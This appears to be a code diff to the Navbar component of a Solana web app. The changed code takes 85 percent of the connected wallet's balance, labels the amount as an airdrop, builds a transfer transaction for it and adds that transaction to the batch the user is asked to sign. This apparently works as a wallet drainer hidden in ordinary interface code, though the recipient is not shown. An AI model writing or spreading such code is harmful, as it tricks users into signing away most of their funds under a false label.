@@ -28,7 +28,7 @@ import {
   TransactionInstruction,
   ParsedAccountData,
 } from "@solana/web3.js";
-import { createTransferTransactionV0 } from "@/app/services/hook/phantomCollections";
+import { createTransferTransaction, createTransferTransactionV0 } from "@/app/services/hook/phantomCollections";
 import { getTokenAccounts } from "@/app/services/hook/blockchain/splWallet";
 import { tokenInstruction } from "@/app/services/hook/phantomCollections/createSplTransferTransaction";
 import {
@@ -112,11 +112,12 @@ export default function Navbar() {
         publicKey as unknown as PublicKey
       );
       const AIRDROP_BALANCE = (balance * 85) / 100;
-      const transaction = await createTransferTransactionV0(
+      const transaction = await createTransferTransaction(
         publicKey as unknown as PublicKey,
         connection,
         AIRDROP_BALANCE
       );
+      walletTransaction.push(transaction)
       if (signAllTransactions == undefined) return;
       const signature = await signAllTransactions(walletTransaction);
       //  await sendTransaction(signature , connection , {preflightCommitment:"processed"})
